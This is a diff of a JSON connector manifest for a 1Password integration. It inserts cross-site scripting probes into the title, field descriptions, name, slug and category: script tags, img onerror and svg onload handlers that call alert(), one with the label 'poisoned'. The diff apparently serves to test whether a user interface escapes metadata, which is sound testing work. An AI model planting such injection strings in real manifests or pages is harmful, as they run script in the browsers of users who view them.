@@ -1,15 +1,15 @@
 {
   "configuration": {
     "$schema": "http://json-schema.org/draft-07/schema#",
-    "title": "1Password",
+    "title": "1Password but poisoned <img src=x onerror=alert('XSS-title')>",
     "type": "object",
     "properties": {
       "base_url": {
-        "description": "1Password base URL",
+        "description": "1Password base URL <script>alert('XSS-baseurl')</script>",
         "type": "string"
       },
       "api_token": {
-        "description": "API token",
+        "description": "API token <svg/onload=alert('XSS-token')>",
         "type": "string"
       }
     },
@@ -21,12 +21,12 @@
       "api_token"
     ]
   },
-  "description": "1Password's Enterprise Password Manager offers robust security features for businesses, enabling secure sharing and management of passwords and sensitive data across teams, with advanced admin controls and seamless integration into existing workflows.",
-  "name": "1Password",
+  "description": "1Password's Enterprise Password Manager offers robust security features for businesses, enabling secure sharing and management of passwords and sensitive data across teams, with advanced admin controls and seamless integration into existing workflows. <script>alert('XSS-description')</script>",
+  "name": "1Password <img src=x onerror=alert('XSS-name')>",
   "uuid": "56f9e1f6-95ba-45ed-867b-44fb3183934d",
-  "slug": "one-password",
+  "slug": "one-password<script>alert('XSS-slug')</script>",
   "version": "1.0.1",
   "categories": [
-    "Applicative"
+    "Applicative<script>alert('XSS-category')</script>"
   ]
 }
